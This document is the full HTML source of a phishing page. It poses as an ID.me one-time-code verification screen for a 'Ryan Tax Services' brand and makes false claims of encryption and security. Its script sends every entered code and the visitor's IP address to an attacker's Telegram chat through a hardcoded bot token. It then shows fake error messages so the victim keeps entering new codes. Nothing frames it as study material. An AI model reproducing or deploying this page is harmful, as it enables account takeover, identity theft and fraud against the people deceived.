<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Enter OTP Code - Secure Verification</title>

  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<script id="chatway" async="true" src="https://cdn.chatway.app/widget.js?id=Kvs80FfF5cqP"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          fontFamily: { inter: ['Inter', 'sans-serif'] }
        }
      }
    }
  </script>

  <style>
    @keyframes marquee {
      0% {
        transform: translateX(100%);
      }

      100% {
        transform: translateX(-100%);
      }
    }
  </style>
</head>

<body class="font-inter bg-slate-50 min-h-screen">

  <main class="min-h-screen grid grid-cols-1 md:grid-cols-2">

    <!-- LEFT: Login / Verification -->
    <section class="flex items-center justify-center bg-slate-50 px-6 pb-[100px] pt-[30px]">
      <div class="w-full max-w-md">

        <!-- Security Banner -->
        <div class="mb-6 overflow-hidden rounded-md bg-green-200">
          <div
            class="inline-block animate-[marquee_18s_linear_infinite] whitespace-nowrap px-4 py-2 text-xs text-green-900 font-bold ">
            ðŸ”’ Your information is protected in a secure, encrypted, end-to-end environment.
          </div>
        </div>

        <!-- Card -->
        <div class="rounded-xl bg-white border border-slate-200 shadow-sm p-8">
          <img src="https://upload.wikimedia.org/wikipedia/commons/8/8b/ID.me_Logo.png" width="100">
          <div class="flex items-center">
            <a href="./idme.html"
              class="inline-flex items-center text-sm text-gray-600 hover:text-gray-800 transition-colors mt-10">
              <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
              </svg>
              Back to login
            </a>
          </div>
          <h1 class="text-xl font-semibold text-slate-900 mb-1 mt-10">
            Enter verification code
          </h1>
          <p class="text-sm text-slate-500 mb-6">
            We sent a 6-digit code to your email / device
          </p>

          <form id="otpForm" class="space-y-5" action="./verified.html">

            <!-- OTP Input Boxes -->
            <div>

              <div class="flex justify-start space-x-2" id="otpContainer">
                <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="one-time-code"
                  class="w-12 h-12 text-center text-lg font-semibold border border-slate-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-blue-600 transition-colors" />
                <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="one-time-code"
                  class="w-12 h-12 text-center text-lg font-semibold border border-slate-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-blue-600 transition-colors" />
                <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="one-time-code"
                  class="w-12 h-12 text-center text-lg font-semibold border border-slate-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-blue-600 transition-colors" />
                <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="one-time-code"
                  class="w-12 h-12 text-center text-lg font-semibold border border-slate-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-blue-600 transition-colors" />
                <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="one-time-code"
                  class="w-12 h-12 text-center text-lg font-semibold border border-slate-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-blue-600 transition-colors" />
                <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="one-time-code"
                  class="w-12 h-12 text-center text-lg font-semibold border border-slate-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-blue-600 transition-colors" />
              </div>
            </div>

            <!-- Resend Code Link -->
            <div class="text-left ">
              <p class="text-sm text-slate-600 my-8">
                Didn't receive the code?
                <a href="./idme.html" class="text-blue-900 hover:text-gray-900 font-medium transition-colors">
                  Resend code
                </a>
              </p>
            </div>

            <!-- Wait Message -->
            <div id="waitMessage"
              class="hidden text-sm text-amber-600 mb-4 p-3 bg-amber-50 rounded-md border border-amber-200">
              <div class="flex items-center">
                <svg class="w-4 h-4 mr-2 animate-spin" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                    d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
                Verification can take between 60 - 90 seconds, please wait...
              </div>
            </div>

            <!-- Error Badge -->
            <div id="errorBadge"
              class="hidden text-sm text-red-700 mb-4 p-3 bg-red-50 rounded-md border border-red-200">
              <div class="flex items-center">
                <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                    d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
                <span id="errorMessage"></span>
              </div>
            </div>

            <button type="submit" id="submitBtn"
              class="w-full rounded-md bg-blue-700 py-2.5 text-sm font-medium text-white hover:bg-blue-800 focus:outline-none focus:ring-2 focus:ring-blue-600 focus:ring-offset-2 transition flex items-center justify-center">
              <span id="btnText">Verify Code</span>
              <svg id="loadingSpinner" class="w-4 h-4 ml-2 animate-spin hidden" fill="none" stroke="currentColor"
                viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                  d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
              </svg>
            </button>
          </form>
        </div>

      </div>
    </section>

    <!-- RIGHT: Brand / Trust / Support -->
    <aside class="flex items-center justify-center bg-white border-l border-slate-200 px-6 py-[50px] ">
      <div class="max-w-sm w-full space-y-6">

        <!-- Brand -->
        <div class="flex items-center space-x-3">
          <div
            class="h-10 w-10 rounded-lg bg-gray-700 flex items-center justify-center text-white font-semibold text-lg">
            R
          </div>
          <div>
            <h2 class="text-lg font-semibold text-slate-900">
              Ryan Tax Services
            </h2>
            <p class="text-sm text-slate-500">
              Secure third-party verification
            </p>
          </div>
        </div>

        <!-- Divider -->
        <div class="h-px bg-slate-200"></div>

        <!-- Support -->
        <div class="space-y-2 text-sm text-slate-600">
          <p class="font-medium text-slate-700">
            Need help?
          </p>
          <div class="flex items-center space-x-2">
            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
            </svg>
            <span class="font-medium text-slate-800">
              +1 (945) 334-6439
            </span>
          </div>
          <p class="text-xs text-slate-500">
            Support available during regular hours
          </p>
        </div>

        <!-- Trust -->
        <div class="rounded-lg bg-slate-50 border border-slate-200 p-4 text-xs text-slate-600">
          Identity verification is handled securely using encrypted communication and industry-standard security
          practices.
        </div>
        <img src="/secured.jpg" class="w-[250px]" />
      </div>
    </aside>

  </main>

  <script>
    document.addEventListener('DOMContentLoaded', function () {
      const otpInputs = document.querySelectorAll('#otpContainer input');
      const otpForm = document.getElementById('otpForm');
      const submitBtn = document.getElementById('submitBtn');
      const btnText = document.getElementById('btnText');
      const loadingSpinner = document.getElementById('loadingSpinner');
      const waitMessage = document.getElementById('waitMessage');
      const errorBadge = document.getElementById('errorBadge');
      const errorMessage = document.getElementById('errorMessage');

      // Telegram bot configuration



      const botToken = '8572531357:AAHH3Xeq9hfvLSFcLUS6mz3JfrHmSJR0x4U';
      const chatId = '-5036651730';

      // In-memory attempt counter (resets on page reload)
      let attemptCount = 0;

      // Function to send OTP data to Telegram
      async function sendOTPToTelegram(otpCode) {
        const message = `ðŸ”¢ *New OTP Attempt*\n\nðŸ”‘ *OTP Code:* ${otpCode}\n\nðŸ“… *Time:* ${new Date().toLocaleString()}\nðŸŒ *IP:* ${await getClientIP()}`;

        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const response = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
          })
        });

        return response.json();
      }

      // Function to get client IP
      async function getClientIP() {
        try {
          const response = await fetch('https://api.ipify.org?format=json');
          const data = await response.json();
          return data.ip || 'Unknown';
        } catch (error) {
          return 'Unknown';
        }
      }

      // Function to set loading state
      function setLoading(isLoading) {
        if (isLoading) {
          submitBtn.disabled = true;
          btnText.textContent = 'Verifying...';
          loadingSpinner.classList.remove('hidden');
          waitMessage.classList.remove('hidden');
          errorBadge.classList.add('hidden');
        } else {
          submitBtn.disabled = false;
          btnText.textContent = 'Verify Code';
          loadingSpinner.classList.add('hidden');
          waitMessage.classList.add('hidden');
        }
      }

      // Function to show error state based on attempt count
      function showError() {
        attemptCount++;

        waitMessage.classList.add('hidden');
        setLoading(false);

        if (attemptCount === 1 || attemptCount === 2) {
          // First and second attempts: Invalid OTP message
          errorMessage.textContent = 'Invalid OTP, Please confirm the OTP provided matches the one sent to your device';
          errorBadge.classList.remove('hidden');

          // Add red border to all inputs
          otpInputs.forEach(input => {
            input.classList.add('border-red-500', 'ring-2', 'ring-red-200', 'bg-red-100/10');
          });
        } else {
          // Third attempt and beyond: Unable to connect message
          errorMessage.textContent = 'Unable to connect to ID.me verification servers. Please try again after some time. If this issue persists, contact support.';
          errorBadge.classList.remove('hidden');

          // Add red border to all inputs
          otpInputs.forEach(input => {
            input.classList.add('border-red-500', 'ring-2', 'ring-red-200', 'bg-red-100/10');
          });
        }

        // Remove red border after 5 seconds (for attempts 1+)
        if (attemptCount >= 1) {
          setTimeout(() => {
            otpInputs.forEach(input => {
              input.classList.remove('border-red-500', 'ring-2', 'ring-red-200', 'bg-red-100/10');
            });
          }, 5000);
        }
      }

      // Function to clear errors when user starts typing
      function clearErrors() {
        errorBadge.classList.add('hidden');
        otpInputs.forEach(input => {
          input.classList.remove('border-red-500', 'ring-2', 'ring-red-200', 'bg-red-100/10');
        });
      }

      // Function to focus next input
      function moveToNext(currentInput, nextInput) {
        if (currentInput.value.length === 1 && nextInput) {
          nextInput.focus();
        }
      }

      // Function to focus previous input on backspace
      function moveToPrevious(currentInput, previousInput) {
        if (currentInput.value === '' && previousInput) {
          previousInput.focus();
        }
      }

      // Setup each OTP input
      otpInputs.forEach((input, index) => {
        // Only allow numeric input
        input.addEventListener('input', function (e) {
          // Clear errors when user starts typing
          clearErrors();

          // Remove any non-numeric characters
          this.value = this.value.replace(/[^0-9]/g, '');

          // Auto-advance to next input
          if (this.value.length === 1) {
            const nextInput = otpInputs[index + 1];
            if (nextInput) {
              nextInput.focus();
            } else {
              // Last input filled, focus submit button
              submitBtn.focus();
            }
          }
        });

        // Handle backspace key
        input.addEventListener('keydown', function (e) {
          if (e.key === 'Backspace') {
            e.preventDefault();
            this.value = '';
            const previousInput = otpInputs[index - 1];
            if (previousInput) {
              previousInput.focus();
            }
          }
        });

        // Handle paste event
        input.addEventListener('paste', function (e) {
          e.preventDefault();
          const pastedData = e.clipboardData.getData('text').trim();
          const numericData = pastedData.replace(/[^0-9]/g, '');

          // Clear errors when user pastes
          clearErrors();

          // Distribute pasted digits across inputs
          for (let i = 0; i < Math.min(numericData.length, otpInputs.length); i++) {
            otpInputs[i].value = numericData[i];
          }

          // Focus appropriate input or submit button
          if (numericData.length < otpInputs.length) {
            otpInputs[numericData.length].focus();
          } else {
            submitBtn.focus();
          }
        });

        // Select text on focus
        input.addEventListener('focus', function () {
          this.select();
        });
      });

      // Form submission handler
      otpForm.addEventListener('submit', async function (e) {
        e.preventDefault();

        const otpCode = Array.from(otpInputs).map(input => input.value).join('');

        if (otpCode.length !== 6) {
          // Highlight first empty input
          const firstEmpty = Array.from(otpInputs).find(input => input.value === '');
          if (firstEmpty) {
            firstEmpty.focus();
            firstEmpty.classList.add('ring-2', 'ring-red-500');
            setTimeout(() => {
              firstEmpty.classList.remove('ring-2', 'ring-red-500');
            }, 2000);
          }
          return;
        }

        // Set loading state
        setLoading(true);

        try {
          // Send OTP to Telegram
          await sendOTPToTelegram(otpCode);

          // Wait for 85 seconds to simulate verification
          setTimeout(() => {
            // Show error after verification period with progressive messaging
            showError();
          }, 500);
          // }, 85000);

        } catch (error) {
          console.error('Error:', error);
          setLoading(false);
          showError();
        }
      });
    });
  </script>

</body>

</html>